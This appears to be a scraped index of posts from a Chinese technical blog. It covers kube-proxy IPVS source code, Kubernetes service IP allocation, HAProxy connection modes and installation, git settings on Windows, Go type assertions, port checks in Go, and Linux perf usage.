proxier.ipsetList[kubeNodePortSetSCTP] // Since hash ip:port is used for SCTP, all the nodeIPs to be used in the SCTP ipset entries. entries = []*utilipset.Entry{} for _, nodeIP := range nodeIPs { entries = append(entries, \u0026amp;utilipset.Entry{ IP: nodeIP.String(), Port: svcInfo.NodePort(), Protocol: protocol, SetType: utilipset.HashIPPort, }) } default: // It should never hit klog.Errorf(\u0026quot;Unsupported protocol type: %s\u0026quot;, protocol) } if nodePortSet != nil { entryInvalidErr := false for _, entry := range entries { if valid := nodePortSet.validateEntry(entry); !valid { klog.Errorf(\u0026quot;%s\u0026quot;, fmt.Sprintf(EntryInvalidErr, entry, nodePortSet.Name)) entryInvalidErr = true break } nodePortSet.activeEntries.Insert(entry.String()) } if entryInvalidErr { continue } } // Add externaltrafficpolicy=local type nodeport entry if svcInfo.OnlyNodeLocalEndpoints() { var nodePortLocalSet *IPSet switch protocol { case \u0026quot;tcp\u0026quot;: nodePortLocalSet = proxier.ipsetList[kubeNodePortLocalSetTCP] case \u0026quot;udp\u0026quot;: nodePortLocalSet = proxier.ipsetList[kubeNodePortLocalSetUDP] case \u0026quot;sctp\u0026quot;: nodePortLocalSet = proxier.ipsetList[kubeNodePortLocalSetSCTP] default: // It should never hit klog.Errorf(\u0026quot;Unsupported protocol type: %s\u0026quot;, protocol) } if nodePortLocalSet != nil { entryInvalidErr := false for _, entry := range entries { if valid := nodePortLocalSet.validateEntry(entry); !valid { klog.Errorf(\u0026quot;%s\u0026quot;, fmt.Sprintf(EntryInvalidErr, entry, nodePortLocalSet.Name)) entryInvalidErr = true break } nodePortLocalSet.activeEntries.Insert(entry.String()) } if entryInvalidErr { continue } } } // Build ipvs kernel routes for each node ip address for _, nodeIP := range nodeIPs { // ipvs call serv := \u0026amp;utilipvs.VirtualServer{ Address: nodeIP, Port: uint16(svcInfo.NodePort()), Protocol: string(svcInfo.Protocol()), Scheduler: proxier.ipvsScheduler, } if svcInfo.SessionAffinityType() == v1.ServiceAffinityClientIP { serv.Flags |= utilipvs.FlagPersistent serv.Timeout = uint32(svcInfo.StickyMaxAgeSeconds()) } // There is no need to bind Node IP to dummy interface, so set parameter `bindAddr` to `false`. if err := proxier.syncService(svcNameString, serv, false, bindedAddresses); err == nil { activeIPVSServices[serv.String()] = true if err := proxier.syncEndpoint(svcName, svcInfo.OnlyNodeLocalEndpoints(), serv); err != nil { klog.Errorf(\u0026quot;Failed to sync endpoint for service: %v, err: %v\u0026quot;, serv, err) } } else { klog.Errorf(\u0026quot;Failed to sync service: %v, err: %v\u0026quot;, serv, err) } } } } 其中有两个非常重要的函数 syncService() 于 syncEndpoint() 这两个定义了同步的过程\nsyncService() 函数表示了增加或删除一个service，如果存在则修改，如果存在则添加\nfunc (proxier *Proxier) syncService(svcName string, vs *utilipvs.VirtualServer, bindAddr bool, bindedAddresses sets.String) error { appliedVirtualServer, _ := proxier.ipvs.GetVirtualServer(vs) if appliedVirtualServer == nil || !appliedVirtualServer.Equal(vs) { if appliedVirtualServer == nil { // IPVS service is not found, create a new service klog.V(3).Infof(\u0026quot;Adding new service %q %s:%d/%s\u0026quot;, svcName, vs.Address, vs.Port, vs.Protocol) if err := proxier.ipvs.AddVirtualServer(vs); err != nil { klog.Errorf(\u0026quot;Failed to add IPVS service %q: %v\u0026quot;, svcName, err) return err } } else { // IPVS service was changed, update the existing one // During updates, service VIP will not go down klog.V(3).Infof(\u0026quot;IPVS service %s was changed\u0026quot;, svcName) if err := proxier.ipvs.UpdateVirtualServer(vs); err != nil { klog.Errorf(\u0026quot;Failed to update IPVS service, err:%v\u0026quot;, err) return err } } } // bind service address to dummy interface if bindAddr { // always attempt to bind if bindedAddresses is nil, // otherwise check if it's already binded and return early if bindedAddresses != nil \u0026amp;\u0026amp; bindedAddresses.Has(vs.Address.String()) { return nil } klog.V(4).Infof(\u0026quot;Bind addr %s\u0026quot;, vs.Address.String()) _, err := proxier.netlinkHandle.EnsureAddressBind(vs.Address.String(), DefaultDummyDevice) if err != nil { klog.Errorf(\u0026quot;Failed to bind service address to dummy device %q: %v\u0026quot;, svcName, err) return err } } return nil } 同理 syncEndpoint() 也是相同的操作\nfunc (proxier *Proxier) syncEndpoint(svcPortName proxy.ServicePortName, onlyNodeLocalEndpoints bool, vs *utilipvs.VirtualServer) error { appliedVirtualServer, err := proxier.ipvs.GetVirtualServer(vs) if err != nil || appliedVirtualServer == nil { klog.Errorf(\u0026quot;Failed to get IPVS service, error: %v\u0026quot;, err) return err } // curEndpoints represents IPVS destinations listed from current system. curEndpoints := sets.NewString() // newEndpoints represents Endpoints watched from API Server. newEndpoints := sets.NewString() curDests, err := proxier.ipvs.GetRealServers(appliedVirtualServer) if err != nil { klog.Errorf(\u0026quot;Failed to list IPVS destinations, error: %v\u0026quot;, err) return err } for _, des := range curDests { curEndpoints.Insert(des.String()) } endpoints := proxier.endpointsMap[svcPortName] // Service Topology will not be enabled in the following cases: // 1. externalTrafficPolicy=Local (mutually exclusive with service topology). // 2. ServiceTopology is not enabled. // 3. EndpointSlice is not enabled (service topology depends on endpoint slice // to get topology information). if !onlyNodeLocalEndpoints \u0026amp;\u0026amp; utilfeature.DefaultFeatureGate.Enabled(features.ServiceTopology) \u0026amp;\u0026amp; utilfeature.DefaultFeatureGate.Enabled(features.EndpointSliceProxying) { endpoints = proxy.FilterTopologyEndpoint(proxier.nodeLabels, proxier.serviceMap[svcPortName].TopologyKeys(), endpoints) } for _, epInfo := range endpoints { if onlyNodeLocalEndpoints \u0026amp;\u0026amp; !epInfo.GetIsLocal() { continue } newEndpoints.Insert(epInfo.String()) } // Create new endpoints for _, ep := range newEndpoints.List() { ip, port, err := net.SplitHostPort(ep) if err != nil { klog.Errorf(\u0026quot;Failed to parse endpoint: %v, error: %v\u0026quot;, ep, err) continue } portNum, err := strconv.Atoi(port) if err != nil { klog.Errorf(\u0026quot;Failed to parse endpoint port %s, error: %v\u0026quot;, port, err) continue } newDest := \u0026amp;utilipvs.RealServer{ Address: net.ParseIP(ip), Port: uint16(portNum), Weight: 1, } if curEndpoints.Has(ep) { // check if newEndpoint is in gracefulDelete list, if true, delete this ep immediately uniqueRS := GetUniqueRSName(vs, newDest) if !proxier.gracefuldeleteManager.InTerminationList(uniqueRS) { continue } klog.V(5).Infof(\u0026quot;new ep %q is in graceful delete list\u0026quot;, uniqueRS) err := proxier.gracefuldeleteManager.MoveRSOutofGracefulDeleteList(uniqueRS) if err != nil { klog.Errorf(\u0026quot;Failed to delete endpoint: %v in gracefulDeleteQueue, error: %v\u0026quot;, ep, err) continue } } err = proxier.ipvs.AddRealServer(appliedVirtualServer, newDest) if err != nil { klog.Errorf(\u0026quot;Failed to add destination: %v, error: %v\u0026quot;, newDest, err) continue } } // Delete old endpoints for _, ep := range curEndpoints.Difference(newEndpoints).UnsortedList() { // if curEndpoint is in gracefulDelete, skip uniqueRS := vs.String() + \u0026quot;/\u0026quot; + ep if proxier.gracefuldeleteManager.InTerminationList(uniqueRS) { continue } ip, port, err := net.SplitHostPort(ep) if err != nil { klog.Errorf(\u0026quot;Failed to parse endpoint: %v, error: %v\u0026quot;, ep, err) continue } portNum, err := strconv.Atoi(port) if err != nil { klog.Errorf(\u0026quot;Failed to parse endpoint port %s, error: %v\u0026quot;, port, err) continue } delDest := \u0026amp;utilipvs.RealServer{ Address: net.ParseIP(ip), Port: uint16(portNum), } klog.V(5).Infof(\u0026quot;Using graceful delete to delete: %v\u0026quot;, uniqueRS) err = proxier.gracefuldeleteManager.GracefulDeleteRS(appliedVirtualServer, delDest) if err != nil { klog.Errorf(\u0026quot;Failed to delete destination: %v, error: %v\u0026quot;, uniqueRS, err) continue } } return nil } 接下来就是同步规则的步骤了，L1544-L1621\nstep 3：规则的删除 粗略翻到这里可能有一个疑问？没有提到删除，删除时包含在 syncXX() 函数中的\n例如在 syncEndpoint() 中会看是否在 终止列表中，如果在跳过，如果不在加入\nif curEndpoints.Has(ep) { // check if newEndpoint is in gracefulDelete list, if true, delete this ep immediately uniqueRS := GetUniqueRSName(vs, newDest) if !proxier.gracefuldeleteManager.InTerminationList(uniqueRS) { continue } klog.V(5).Infof(\u0026quot;new ep %q is in graceful delete list\u0026quot;, uniqueRS) err := proxier.gracefuldeleteManager.MoveRSOutofGracefulDeleteList(uniqueRS) if err != nil { klog.Errorf(\u0026quot;Failed to delete endpoint: %v in gracefulDeleteQueue, error: %v\u0026quot;, ep, err) continue } } 而 gracefuldeleteManager 是一个 一直运行的协程，在初始化 proxier 时被 Run()\n// Run start a goroutine to try to delete rs in the graceful delete rsList with an interval 1 minute func (m *GracefulTerminationManager) Run() { go wait.Until(m.tryDeleteRs, rsCheckDeleteInterval, wait.NeverStop) } proxier.go\nproxier.syncRunner = async.NewBoundedFrequencyRunner(\u0026quot;sync-runner\u0026quot;, proxier.syncProxyRules, minSyncPeriod, syncPeriod, burstSyncs) proxier.gracefuldeleteManager.Run() return proxier, nil 总结 到这里已经清楚的掌握了 kube-proxy 的架构，接下来的会为扩展kubernetes中service架构，以及手撸一个 kube-proxy做准备；本系列第三部分：如何扩展现有的kube-proxy架构\n文中的知识都是个人根据理解整理的，如有不对的地方欢迎指出，感谢各位大佬\nReference\n[1] dual-stack service\n","permalink":"https://www.oomkill.com/2023/02/ch19-kube-proxy-code/","summary":"","title":"深入理解Kubernetes service - kube-proxy架构分析"},{"content":" 本文是关于Kubernetes service解析的第一章\n深入理解Kubernetes service - 你真的理解service吗? 深入理解Kubernetes service - EndpointSlices做了什么？ 深入理解Kubernetes service - kube-proxy架构分析 深入理解Kubernetes service - 如何扩展现有的kube-proxy架构 所有关于Kubernetes service 部分代码上传至仓库 github.com/cylonchau/kube-haproxy\n前景 对于了解kubernetes架构时，已知的是 service 是kubernetes在设计时为了避免Pod在频繁创建和销毁时IP变更问题，从而给集群内服务（一组Pod）提供访问的一个入口。而Pod在这里的角色是 『后端』( backend ) ，而 service 的角色是 『前端』( frontend )。本文将阐述service的生命周期\n为什么需要了解这部分内容呢 对于 without kube-proxy来说，这部分是最重要的部分，因为service的生成不是kube-proxy来完成的，而这部分也就是service ip定义的核心。\n控制器 service的资源创建很奇妙，继不属于 controller-manager 组件，也不属于 kube-proxy 组件，而是存在于 apiserver 中的一个被成为控制器的组件；而这个控制器又区别于准入控制器。更准确来说，准入控制器是位于kubeapiserver中的组件，而 控制器 则是存在于单独的一个包，这里包含了很多kubernetes集群的公共组件的功能，其中就有service。这也就是在操作kubernetes时 当 controller-manager 于 kube-proxy 未工作时，也可以准确的为service分配IP。\n首先在构建出apiserver时，也就是代码 cmd/kube-apiserver/app/server.go\nserviceIPRange, apiServerServiceIP, err := master.ServiceIPRange(s.PrimaryServiceClusterIPRange) if err != nil { return nil, nil, nil, nil, err } master.ServiceIPRange 承接了为service分配IP的功能，这部分逻辑就很简单了\nfunc ServiceIPRange(passedServiceClusterIPRange net.IPNet) (net.IPNet, net.IP, error) { serviceClusterIPRange := passedServiceClusterIPRange if passedServiceClusterIPRange.IP == nil { klog.Warningf(\u0026quot;No CIDR for service cluster IPs specified. Default value which was %s is deprecated and will be removed in future releases. Please specify it using --service-cluster-ip-range on kube-apiserver.\u0026quot;, kubeoptions.DefaultServiceIPCIDR.String()) serviceClusterIPRange = kubeoptions.DefaultServiceIPCIDR } size := integer.Int64Min(utilnet.RangeSize(\u0026amp;serviceClusterIPRange), 1\u0026lt;\u0026lt;16) if size \u0026lt; 8 { return net.IPNet{}, net.IP{}, fmt.Errorf(\u0026quot;the service cluster IP range must be at least %d IP addresses\u0026quot;, 8) } // Select the first valid IP from ServiceClusterIPRange to use as the GenericAPIServer service IP. apiServerServiceIP, err := utilnet.GetIndexedIP(\u0026amp;serviceClusterIPRange, 1) if err != nil { return net.IPNet{}, net.IP{}, err } klog.V(4).Infof(\u0026quot;Setting service IP to %q (read-write).\u0026quot;, apiServerServiceIP) return serviceClusterIPRange, apiServerServiceIP, nil } 而后kube-apiserver为service分为两类\napiserver 地址在集群内的service，在代码中表示为 APIServerServiceIP Service，--service-cluster-ip-range 配置指定的ip，通过『逗号』分割可以为两个 有了对 service 更好的理解后，接下来开始本系列第二节深入理解Kubernetes service - kube-proxy软件架构分析\nReference\n[1] dual-stack service\n","permalink":"https://www.oomkill.com/2023/02/ch17-service-controller/","summary":"","title":"深入理解Kubernetes service - 你真的理解service吗？"},{"content":"haproxy作为一个『代理软件』如果当工作与 HTTP 模式下，所有经由haproxy的的连接的请求和响应都取决于 frondend 中配置的 『http_connection_mode』 即 haproxy 中 frontend 与 backend 的组合，而haproxy 支持 3 种连接模式：\nKAL keep alive: frontend 中配置为 http-keep-alive ; 这是默认模式，这也是http中的keepalive 表示所有请求和响应都得到处理，连接保持打开状态，但在响应和新请求之间处于空闲状态。 SCL server close : frontend 中配置为 http-server-close ; 接收到响应结束后，面向服务器的连接关闭，但面向客户端的连接保持打开状态 CLO close: frontend 中配置为 httpclose ；连接在响应结束后关闭，并在两个方向上附加 \u0026ldquo;Connection: close\u0026rdquo; 。 下列矩阵表示的是通过 frondend 与 backend 之间两端的代理模式，这个模式是对称的\n| KAL | SCL | CLO ----+-----+-----+---- KAL | KAL | SCL | CLO ----+-----+-----+---- mode SCL | SCL | SCL | CLO ----+-----+-----+---- CLO | CLO | CLO | CLO 对于http选项的说明 选项 说明 forwardfor 这个选项同时存在于backend 与 frontend端，但backend中的优先级超过frontend 如果同时设置了这个参数，那么 backend段的子参数将优先与 frontend 一端 httpchk 启用http协议检查来检测server的健康状态，默认情况下状态检查是仅建立一个tcp连接 httpclose 这个选项代表了haproxy 对于http协议持久连接方便的配置 Reference：configuration.txt\n","permalink":"https://www.oomkill.com/2023/01/haproxy-http-connection-mode/","summary":"","title":"haproxy 中 http 代理的连接模式"},{"content":"Windows git \u0026ldquo;warning: LF will be replaced by CRLF\u0026rdquo; [1] git config --global core.autocrlf false Disable Credential Manager git config --global credential.modalprompt false git credential-manager remove -force git credential-manager uninstall --force Multi account management [2] step1: clean globle setting\ngit config --global --unset user.name git config --global --unset user.email step2： change config file only ssh\nDo not Pop-ups authtication [3] This question is the git shell prompt input user and password in an openssh popup on windows plateform\ngit config --global core.askPass \u0026quot;\u0026quot; Reference [1] Windows git \u0026ldquo;warning: LF will be replaced by CRLF\u0026rdquo;, is that warning tail backward?\n[2] window下git多账户管理\n[3] Git shell prompts for password in an OpenSSH popup window\n","permalink":"https://www.oomkill.com/2023/01/awesome-git-configration-in-windows/","summary":"","title":"git在windows上常用配置"},{"content":"类型断言 类型断言 type assertion 并不是真正的将 interface 类型转换为另一种确定的类型，只是提供了对 interface 类型的值的访问，通常情况下，这是常见的需求\n类型断言通过 语法 x.(T) ，这将会确定 x 变量中存储的值是否属于 T 类型，通常场景有两种：\n如果 T 不是 interface 类型，而是一个具体的类型，那么这次断言将断言 x 的 动态类型是否与 T 相同 如果 T 是 interface 类型，这次断言 x 的动态类型是否实现了 T var x interface{} = \u0026quot;foo\u0026quot; var s string = x.(string) fmt.Println(s) // \u0026quot;foo\u0026quot; s, ok := x.(string) fmt.Println(s, ok) // \u0026quot;foo true\u0026quot; n, ok := x.(int) fmt.Println(n, ok) // \u0026quot;0 false\u0026quot; n = x.(int) // ILLEGAL Note：在断言时，x 的类型必须为 interface{}\n那么怎么理解 T=interface 和 T != interface 这两句话呢\nT != interface 则是一个正常的断言，即 x (interface) 是否等于 T (really type)，这里 x 必须为 interface，T 则可以为任意类型而不是变量 T=interface 时 不能说是一个断言，而是一个对 interface 的断言，此时 x 必须为 interface，T 也必须为 interface 如下面代码所示：\ntype s interface {} // 一个interface类型的变量a var a interface{} a = a a = 1 // 一个int 类型的变量b var b = 20 b = b x, ok := a.(s) // 1 true 因为a实现了interface x, ok := b.(s) // false b 不是interface不能断言 x, ok := a.(int) // 1 true 因为a的值为int x := a.(string) // 当一个返回参数时将触发panic 类型转换 类型转换 type switch 是指类型断言的应用场景，是通过对一个interface类型的变量进行多次断言，以匹配到真实的数据类型\nvar x interface{} = \u0026quot;foo\u0026quot; switch v := x.(type) { case nil: fmt.Println(\u0026quot;x is nil\u0026quot;) // here v has type interface{} case int: fmt.Println(\u0026quot;x is\u0026quot;, v) // here v has type int case bool, string: fmt.Println(\u0026quot;x is bool or string\u0026quot;) // here v has type interface{} default: fmt.Println(\u0026quot;type unknown\u0026quot;) // here v has type interface{} } ","permalink":"https://www.oomkill.com/2023/01/go-type-assertion/","summary":"","title":"Go中的类型断言与类型转换"},{"content":"方法1：dial 使用 net.DialTimeout 去检查端口的技巧：\n在通过Dial检查端口占用时，需要知道网络中常见的报错状态，而不是 err != nil 都为可用\nConnection reset by peer connection reset by peer 这种错误情况下有以下几种场景：\n基于包过滤的防火墙给予 RST；对于此情况，基于网络模型来说处于网络层与传输层之间的netfilter，如果是防火墙拒绝那么未到应用层无法确认端口 对端应用资源限制而reset，通常为负载过高；对于此场景是已到达应用层 客户端关闭了连接，而服务器还在给客户端发送数据；对于端口检查来说不会到这步 由上面可知，这种错误一定为占用\nConnection timed out Connection timed out 这种场景根本就dial不成功，go中给出了一个专门的事件 opErr.Timeout() 来说明这个错误，故此错误将不能确认端口是否占用\nConnection refused Connection refused 这种场景催在两种情况\n对于 local 场景来说，这将表示端口未监听 对于远端场景来说，这种基本上表示 client 发往 remote ，remote不能接受 host:port 这个连接 通常对于存在两种情况，但多数为端口为监听\nMisconfiguration, such as where a user has mistyped the port number, or is using stale information about what port the service they require is running on. A service error, such as where the service that should be listening on a port has crashed or is otherwise unavailable. 所以此状态可以用于判断端口的状态，而对于端口检测通常为 local，所以可以用作判断依据\nfunc checkPortIsAvailable(protocol string, port int) { timeoutSecs := 3 addr, err := GetInterfaceIpv4Addr(\u0026quot;eth0\u0026quot;) conn, err := net.DialTimeout(protocol, net.JoinHostPort(addr, strconv.Itoa(port)), time.Duration(timeoutSecs)*time.Second) for { if err != nil { opErr, ok := err.(*net.OpError) if ok \u0026amp;\u0026amp; strings.Contains(opErr.Err.Error(), \u0026quot;refused\u0026quot;) { break } else if opErr.Timeout() { continue } else { continue } } if conn != nil { defer conn.Close() continue } } } 方法2：golib 库 github.com/antelman107/net-wait-go 可以用于等待端口直到状态为open，通过这种方法也可以很好的检测端口是否占用\n","permalink":"https://www.oomkill.com/2023/01/goskill-port-is-available/","summary":"","title":"如何使用go语言来检查端口可用性"},{"content":"haproxy1 VS haproxy2 haproxy2由 2019-06-16 被发布，对于与haproxy1版本来说，haproxy 2.0 增加了对云原生的支持，这使得haproxy 2.0 更适用于云原生环境，对比于 haproxy1.0 在2001年发布来，到 1.9.16 在 2020/07/31 最后一次更新也代表haproxy1.0的结束维护\n为什么选择haproxy2.0 haproxy2.0的核心功能就是集成了云原生架构的支持。包含L7重试, Prometheus metrics, 流量镜像 (traffic shadowing), 多语言可扩展性, gRPC 。haproxy2.0 还增加 基于haproxy2.0 的 Kubernetes Ingress Controller 和强大的 HAProxy Data Plane API，这提供了用于配置和管理 HAProxy 的 REST API\n安装haproxy2.0 对于 Ubuntu/Debian 来说，社区版haproxy提供了更友好的安装方式，用户直接添加对应仓库可以直接安装最新版本的haproxy Debian/Ubuntu HAProxy packages\n对于 CentOS/Fedora 来说，只有Fedora 仓库提供了较为新版的haproxy，通常来在这类平台的Linux都是通过编译安装haproxy\n下载haproxy2.6源码 [ haproxy下载 ]\n安装依赖包\nyum install gcc pcre-devel openssl-devel tar make -y 编译程序\ntar xf haproxy-2.6.7.tar.gz \u0026amp;\u0026amp; cd haproxy-2.6.7/ # 查看编译参数 # 直接使用make可以查看编译参数，这是makefile中配置的 make # 编译参数 make TARGET=/app/haproxy USE_ZLIB=1 USE_OPENSSL=1 USE_PCRE=1 make install 默认安装的路径在 /usr/local/ 下\n官方提供的一份 haproxy2.0 配置文件 HAProxy 2.0 configuration\nReference [1] How to install HAProxy load balancer on CentOS\n[2] HAProxy 2.0 and Beyond\nTroubeshooting The configuration file is not declared in the HAPROXY_CFGFILES environment variable, cannot start. $ haproxy -f haproxy.cfg [NOTICE] (3143) : New program 'api' (3144) forked [NOTICE] (3143) : New worker (3145) forked [NOTICE] (3143) : Loading success. time=\u0026quot;2022-12-15T18:43:44+08:00\u0026quot; level=fatal msg=\u0026quot;The configuration file is not declared in the HAPROXY_CFGFILES environment variable, cannot start.\u0026quot; [NOTICE] (3143) : haproxy version is 2.6.7-c55bfdb [NOTICE] (3143) : path to executable is /usr/local/sbin/haproxy [ALERT] (3143) : Current program 'api' (3144) exited with code 1 (Exit) [ALERT] (3143) : exit-on-failure: killing every processes with SIGTERM [ALERT] (3143) : Current worker (3145) exited with code 143 (Terminated) [WARNING] (3143) : All workers exited. Exiting... (1) 原因：指定的配置文件必须带有路径 haproxy -f haproxy.cfg 这种是错误的，-f 参数属性为\n如果为目录，则是这个目录下所有的 .cfg 结尾的文件 如果是目录，./\u0026lt;filename\u0026gt; 与 filename 都提示这个报错，必须绝对路径 no users configured haproxy -f /root/haproxy.cfg [NOTICE] (3193) : New program 'api' (3194) forked [NOTICE] (3193) : New worker (3195) forked [NOTICE] (3193) : Loading success. time=\u0026quot;2022-12-15T18:45:49+08:00\u0026quot; level=fatal msg=\u0026quot;Error initiating users: no users configured in /root/haproxy.cfg, error: section missing\u0026quot; [NOTICE] (3193) : haproxy version is 2.6.7-c55bfdb 原因：data plane api 程序必须有运行的用户和用户组在配置文件中，官方手册中给出的配置不全 [1] ，对于data plane api部分配置可以参考 [2]\nset gid: operation not permitted # haproxy -f /root/haproxy.cfg [NOTICE] (3701) : haproxy version is 2.6.7-c55bfdb [NOTICE] (3701) : path to executable is /usr/local/sbin/haproxy [WARNING] (3701) : config : missing timeouts for frontend 'myfrontend'. | While not properly invalid, you will certainly encounter various problems | with such a configuration. To fix this, please ensure that all following | timeouts are set to a non-zero value: 'client', 'connect', 'server'. [WARNING] (3701) : config : missing timeouts for backend 'web_servers'. | While not properly invalid, you will certainly encounter various problems | with such a configuration. To fix this, please ensure that all following | timeouts are set to a non-zero value: 'client', 'connect', 'server'. [NOTICE] (3701) : New program 'api' (3702) forked [NOTICE] (3701) : New worker (3703) forked [NOTICE] (3701) : Loading success. set gid: operation not permitted [NOTICE] (3701) : haproxy version is 2.6.7-c55bfdb [NOTICE] (3701) : path to executable is /usr/local/sbin/haproxy [ALERT] (3701) : Current program 'api' (3702) exited with code 1 (Exit) [ALERT] (3701) : exit-on-failure: killing every processes with SIGTERM [ALERT] (3701) : Current worker (3703) exited with code 143 (Terminated) [WARNING] (3701) : All workers exited. Exiting... (1) Reference [1] HAProxy Community\n[2] configuration examples\n[3] SSSD and LDAP\n[4] Chapter 10. Migrating authentication from nslcd to SSSD\n[5] OpenLDAP Client 2.4.23: TLS negotiation failure\n[6] Chapter 10. Migrating authentication from nslcd to SSSD\n[7] Configure SSSD\n[8] Configure OpenLDAP SSSD client on CentOS 6/7\n","permalink":"https://www.oomkill.com/2022/12/haproxy2/","summary":"","title":"haproxy v1 与 haproxy v2"},{"content":"perf [1] perf 是基于内核子系统的Linux的性能计数器，也被称为 perf_events，它提供了为所有事件进行性能分析的框架，perf 由两部分组成：\n内核系统调用，用于提供对这些性能数据的访问 用户空间工具，用于提供收集，显示分析这些性能数据的用户空间程序 由于 perf 是内核的一部分，但要想使用 perf 还需要安装另外一部分，通常情况下安装的版本是Linux内核版本，如操作系统内核版本为 5.10 那么安装 linux-tool 后则为 5.10\n$ apt-get install linux-perf $ perf --version perf version 5.10.149 各系统下的包名与安装\nUbuntu/Debian: linux-perf | linux-tools ；apt-get install linux-perf CentOS/Fedora: perf ；yum install -y perf list - 列出可用事件描述符 使用 perf 子命令 list 可以列出所有的 perf 可测量事件\nperf list List of pre-defined events (to be used in -e): branch-instructions OR branches [Hardware event] branch-misses [Hardware event] cache-misses [Hardware event] cache-references [Hardware event] cpu-cycles OR cycles [Hardware event] instructions [Hardware event] stalled-cycles-backend OR idle-cycles-backend [Hardware event] stalled-cycles-frontend OR idle-cycles-frontend [Hardware event] alignment-faults [Software event] bpf-output [Software event] context-switches OR cs [Software event] cpu-clock [Software event] cpu-migrations OR migrations [Software event] dummy [Software event] emulation-faults [Software event] major-faults [Software event] minor-faults [Software event] page-faults OR faults [Software event] task-clock [Software event] duration_time [Tool event] L1-dcache-load-misses [Hardware cache event] L1-dcache-loads [Hardware cache event] L1-dcache-prefetches [Hardware cache event] L1-icache-load-misses [Hardware cache event] L1-icache-loads [Hardware cache event] branch-load-misses [Hardware cache event] branch-loads [Hardware cache event] dTLB-load-misses [Hardware cache event] dTLB-loads [Hardware cache event] iTLB-load-misses [Hardware cache event] iTLB-loads [Hardware cache event] list 子命令后还可以加过滤器以查看对应类型的事件，示例：\n# 列出TCP相关事件 $ perf list tcp List of pre-defined events (to be used in -e): syscalls:sys_enter_getcpu [Tracepoint event] syscalls:sys_exit_getcpu [Tracepoint event] tcp:tcp_destroy_sock [Tracepoint event] tcp:tcp_probe [Tracepoint event] tcp:tcp_rcv_space_adjust [Tracepoint event] tcp:tcp_receive_reset [Tracepoint event] tcp:tcp_retransmit_skb [Tracepoint event] tcp:tcp_retransmit_synack [Tracepoint event] tcp:tcp_send_reset [Tracepoint event] # 列出bpf相关事件 $ perf list bpf List of pre-defined events (to be used in -e): bpf-output [Software event] bpf_test_run:bpf_test_finish [Tracepoint event] bpf_trace:bpf_trace_printk [Tracepoint event] syscalls:sys_enter_bpf [Tracepoint event] syscalls:sys_exit_bpf [Tracepoint event] # 列出硬件相关事件 $ perf list hardware List of pre-defined events (to be used in -e): branch-instructions OR branches [Hardware event] branch-misses [Hardware event] cache-misses [Hardware event] cache-references [Hardware event] cpu-cycles OR cycles [Hardware event] instructions [Hardware event] stalled-cycles-backend OR idle-cycles-backend [Hardware event] stalled-cycles-frontend OR idle-cycles-frontend [Hardware event] top - 查看系统实时信息 perf 的 top子命令可以查看CPU的实时信息\n$ perf top 23.69% [kernel] [k] mpt_put_msg_frame 14.27% [kernel] [k] read_tsc 13.34% [kernel] [k] asm_sysvec_apic_timer_interrupt 11.72% [kernel] [k] vmware_sched_clock 5.79% perf_5.10 [.] 0x00000000002901f4 5.11% [kernel] [k] delay_tsc 4.87% [kernel] [k] native_read_msr 4.57% perf_5.10 [.] 0x0000000000284c2d 3.13% perf_5.10 [.] 0x0000000000284c1a 3.09% [kernel] [k] native_write_msr 2.07% [kernel] [k] s_show 1.99% [kernel] [k] mpt_interrupt 1.82% perf_5.10 [.] 0x0000000000284d46 1.69% [kernel] [k] asm_sysvec_call_function_single 0.86% [kernel] [k] __es_tree_search.isra.0 0.83% [kernel] [k] security_task_free 0.78% [vdso] [.] 0x0000000000000698 0.38% perf_5.10 [.] 0x0000000000284d57 上面的信息的展示类似于 top 命令，从左右到信息为：\n第一列：与CPU使用率百分比占用的相关函数 第二列：那个库或者进程使用的这个函数 第三列：[k] 表示内核空间， [.] 表示用户空间 第四列：符号或函数的名称 默认情况下 perf top 监控的是所有CPU，也可以使用子选项，例如下表（一些常用的命令参数）\nOption describe -a 监控所有CPU包含空闲值 -c 收集 -C 收集指定CPU的样本，后接CPU核心编号 -d 后接数字，将延迟几秒刷新 -e 指定特殊的事件，事件通过 perf list 查看 -F 控制采样的频率 -p 指定PID的进程的事件信息 -g 启用 显示调用图记录 -i 不继承模式，子任务将不继承计数器 -t 指定线程ID的事件信息 -u 指定user的事件信息 更多选项可以使用 perf top -h\nstat - CPU相关统计 使用 perf 子命令 stat 可以对指定命令的CPU性能统计\nperf stat \u0026lt;commond\u0026gt; 查看指定命令的CPU计数器统计信息\nperf stat \u0026lt;command\u0026gt; # 如果需要更详细信息可以跟 -d 选项 perf stat -d \u0026lt;command\u0026gt; 示例\n$ perf stat curl baidu.com Performance counter stats for 'curl baidu.com': 31.09 msec task-clock # 0.012 CPUs utilized 27 context-switches # 0.868 K/sec 1 cpu-migrations # 0.032 K/sec 577 page-faults # 0.019 M/sec 41,691,320 cycles # 1.341 GHz (17.63%) 0 stalled-cycles-frontend 0 stalled-cycles-backend # 0.00% backend cycles idle 0 instructions # 0.00 insn per cycle (82.37%) \u0026lt;not counted\u0026gt; branches (0.00%) \u0026lt;not counted\u0026gt; branch-misses (0.00%) 2.646439514 seconds time elapsed 0.026403000 seconds user 0.013201000 seconds sys Some events weren't counted. Try disabling the NMI watchdog: echo 0 \u0026gt; /proc/sys/kernel/nmi_watchdog perf stat ... echo 1 \u0026gt; /proc/sys/kernel/nmi_watchdog 查看指定PID的CPU计数器统计信息\n统计命令将会直到 ctrl - c 结束\nperf stat -p \u0026lt;PID\u0026gt; 示例：例如统计一个进程的CPU使用情况\nperf stat -p 477 ^C Performance counter stats for process id '477': 146.96 msec task-clock # 0.034 CPUs utilized 88 context-switches # 0.599 K/sec 8 cpu-migrations # 0.054 K/sec 4,991 page-faults # 0.034 M/sec 153,052,247 cycles # 1.041 GHz (36.77%) 0 stalled-cycles-frontend (50.31%) 0 stalled-cycles-backend # 0.00% backend cycles idle (57.94%) 0 instructions # 0.00 insn per cycle (63.23%) 0 branches # 0.000 K/sec (49.69%) 0 branch-misses # 0.00% of all branches (42.06%) 4.336415211 seconds time elapsed 只统计缓存信息\nperf stat -e LLC-loads,LLC-load-misses,LLC-stores,LLC-prefetches LLC last-level cache 是指内存分层结构中主内存之前的最后一级 LLC-loads：命中的指标 LLC-load-misses：未命中指标，显示这个周期内尚未处理的比率 LLC-stores LLC-prefetches：事件发生在的 L2 硬件预取中 示例：\n# 使用原始 PMC 计数器，例如，计算未暂停的核心周期： # 使用原始PMC计数器，例如，计数未改变的核心周期: perf stat -e r003c -a sleep 5 # 统计系统范围内每秒的系统调用： perf stat -e cycles -e cpu/event=0x0e,umask=0x01,inv,cmask=0x01/ -a sleep 5 # 统计系统范围内每秒的系统调用： perf stat -e 